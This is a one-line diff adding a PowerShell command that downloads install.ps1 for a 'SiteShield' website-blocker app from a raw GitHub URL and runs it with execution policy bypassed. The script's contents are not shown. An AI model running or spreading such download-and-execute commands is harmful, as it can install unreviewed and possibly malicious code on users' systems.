@@ -1,0 +1,1 @@
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "iwr 'https://raw.githubusercontent.com/7020227649/website-blocker-pc-app-with-built-in-locker/main/install.ps1' -OutFile $env:TEMP\SiteShield-install.ps1; powershell.exe -NoProfile -ExecutionPolicy Bypass -File $env:TEMP\SiteShield-install.ps1"
